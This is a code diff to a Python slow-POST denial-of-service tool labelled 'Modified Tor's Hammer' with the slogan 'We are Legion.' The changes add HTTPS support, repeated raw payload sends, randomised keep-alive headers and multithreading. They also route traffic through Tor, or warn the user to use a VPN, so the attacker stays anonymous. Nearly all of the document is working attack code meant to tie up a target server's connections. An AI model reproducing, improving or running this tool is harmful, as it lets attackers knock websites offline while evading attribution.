@@ -1,9 +1,13 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
+from ast import parse
+from importlib.resources import path
 import sys
 from threading import Thread
 import socks
+import http.client
+from urllib.parse import urlparse
 import ssl
 import socket
 import argparse
@@ -71,7 +75,16 @@ class Connection(object):
         self.tor_port = tor_port
         self.tor_password = tor_password
 
+        parsed_url = urlparse(self.target)
+        self.path = parsed_url.path
+        if self.path == '': self.path = '/'
+        self.host = parsed_url.netloc.split(':')[0]
+
         self.target_ip = socket.gethostbyname(target.replace('https://', '').replace('http://', ''))
+
+        # DEBUG INFO
+        if DEBUG:
+            Colors.debug(f'{type(self).__name__}.__init__', f'Host IP: {self.target_ip}')
 
 
 class ATACMS(object):
@@ -81,7 +94,8 @@ class ATACMS(object):
 
         self.c = c
         self.connected = False
-        self.socks = socks.socksocket()
+        self.socket = socks.socksocket()
+        self.client = None
         self.ssl_wrap = None
 
         self.name = 'ATACMS'
@@ -92,12 +106,15 @@ class ATACMS(object):
         if self.connected: self._disconnect()
 
         try:
-            if self.c.use_tor:
-                self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, self.c.tor_ip, self.c.tor_port)
-            self.socks.connect((self.c.target_ip, self.c.target_port))
-            
             if self.c.use_ssl:
-                self.ssl_wrap = ssl.wrap_socket(self.socks, cert_reqs=ssl.CERT_NONE)
+                self.client = http.client.HTTPSConnection(
+                    self.c.host,
+                    self.c.target_port
+                )
+            else:
+                if self.c.use_tor:
+                    self.socket.setproxy(socks.PROXY_TYPE_SOCKS5, self.c.tor_ip, self.c.tor_port)
+                self.socket.connect((self.c.target_ip, self.c.target_port))
 
             self.connected = True
 
@@ -119,26 +136,30 @@ class ATACMS(object):
         
         if self.connected:
 
-            if self.ssl_wrap is not None:
-                self.ssl_wrap.shutdown()
-                self.ssl_wrap.close()
-                self.ssl_wrap = None
-
-            if self.socks is not None:
+            if self.c.use_ssl:
                 try:
-                    self.socks.shutdown(socks.socket.SHUT_RDWR)
-                    self.socks.close()
-                    self.socks = socks.socksocket()
+                    self.client.close()
+                    self.client = None
                 except:
-                    pass # silently ignore
+                        pass # silently ignore
+
+            else:
+                if self.socket is not None:
+                    try:
+                        self.socket.shutdown(socks.socket.SHUT_RDWR)
+                        self.socket.close()
+                    except:
+                        pass # silently ignore
+
+                    self.socket = socks.socksocket()
                 
                 # DEBUG INFO
                 if DEBUG:
                     Colors.debug(f'{type(self).__name__}._disconnect', f'Disconnected')
                     
-                self.connected = False
-    
+            self.connected = False
 
+    
     def _prepare_http(self, headers: dict, msg: str) -> str:
 
         http = ''
@@ -164,14 +185,37 @@ class ATACMS(object):
 
         if self.connected:
             try:
-                
-                msg = self._prepare_http(headers, msg)
 
                 if self.c.use_ssl:
-                    self.ssl_wrap.sendall(msg.encode('utf-8'))
+                    if headers is not None:
+                        self.client.request(
+                            'post',
+                            self.c.path,
+                            None,
+                            headers
+                        )
+                    else:
+                        # self.client.send(msg.encode('utf-8'))
+
+                        if self.client.sock is None:
+                            if self.client.auto_open:
+                                self.client.connect()
+                            else:
+                                raise Exception('Not connected.')
+                        self.client.sock.sendall(msg.encode('utf-8'))
+                        sleep(1)
+                        self.client.sock.sendall(msg.encode('utf-8'))
+                        self.client.sock.sendall(msg.encode('utf-8'))
+                        sleep(1)
+                        self.client.sock.sendall(msg.encode('utf-8'))
+                        self.client.sock.sendall(msg.encode('utf-8'))
+
+                        i = 99
 
                 else:
-                    self.socks.sendall(msg.encode('utf-8'))
+                    
+                    msg = self._prepare_http(headers, msg)
+                    self.socket.sendall(msg.encode('utf-8'))
             
             except Exception as e:
                 
@@ -193,8 +237,7 @@ class ATACMS(object):
         return self._send_http(None, headers)
 
 
-    # TODO
-    
+    # not used. TOR will change IP every 5-10 mins.    
     def _refresh_tor_ip(self, ) -> bool:
 
 
@@ -242,11 +285,11 @@ class ATACMS(object):
 
                     if stop: break
 
-                    if not self._send_http(random.choice(string.letters+string.digits), None):
+                    if not self._send_http(random.choice(string.ascii_letters), None):
                             
                         # DEBUG INFO
                         if DEBUG:
-                            Colors.debug(f'{type(self).__name__}.send', f'Not able to send message.')
+                            Colors.debug(f'{type(self).__name__}.send', f'Not able to send message')
 
                         return False
 
@@ -390,7 +433,7 @@ class ATACMS(object):
             'Accept-Encoding': ', '.join(roundEncodings),
             'Connection': 'keep-alive', #timeout=5, max=1000
             'Keep-Alive': f'timeout={random.randint(1000,2000)}, max={random.randint(700,1000)}',
-            'Host': self.c.target,
+            'Host': self.c.host,
         }
     
         # Randomly-added headers
@@ -463,15 +506,28 @@ def main(argv):
     args.target = args.target.replace('\'','')
     args.ssl = args.target.startswith('https') == True
 
+    if args.ssl and args.port != 443:
+        Colors.warn('Target is using SSL but port is set to {args.port}.')
+        i = input('Set port to 443 [Y/n]? ')
+        if i == 'y' or i == 'Y' or i == '':
+            args.port = 443
+
     args.use_tor = False
-    if hasattr(args, 'tor_ip'):
-        args.use_tor = True
-        args.tor_ip  = args.tor_ip.replace('\'','')
-        args.tor_password = args.tor_password.replace('\'','')
-    else:
-        args.tor_ip = ''
-        args.tor_port = 0
-        args.tor_password = ''
+    args.tor_ip = ''
+    args.tor_port = 0
+    args.tor_password = ''
+
+    if hasattr(args, 'tor_ip'): 
+        if not args.ssl:
+            args.use_tor = True
+            args.tor_ip  = args.tor_ip.replace('\'','')
+            args.tor_password = args.tor_password.replace('\'','')
+
+            Colors.info('TOR will be used. Please make sure that the service is running.')
+        
+        else:
+            Colors.warn('You can use either TOR or SSL but not both.')
+            Colors.warn('TOR will NOT be used. Make sure that you use VPN.')
 
     nthreads = args.threads
 
@@ -497,18 +553,18 @@ def main(argv):
         threads.append(t)
         t.start()
 
-    print('Processess launched.')
+    Colors.info('Processess launched.')
 
     while len(threads) > 0:
         try:
             threads = [t.join(1) for t in threads if t is not None and t.is_alive()]
         
         except KeyboardInterrupt:
-            print('\nShutting down processes. Please wait until done.\n')
+            Colors.info('\nShutting down processes. Please wait until done.\n')
             
             stop = True
             threads = [t.join() for t in threads if t is not None and t.is_alive()]
-            print('Done.')
+            Colors.info('Done.')
             sys.exit(0)
 
 
@@ -517,8 +573,7 @@ if __name__ == "__main__":
     Colors.info("Modified Tor's Hammer ")
     Colors.info("Slow POST DoS Testing Tool")
     Colors.info("Anon-ymized via Tor")
-    Colors.info("We are Legion.")
-    Colors.info("") 
+    Colors.info("We are Legion.\n")
 
     main(sys.argv[1:])
     
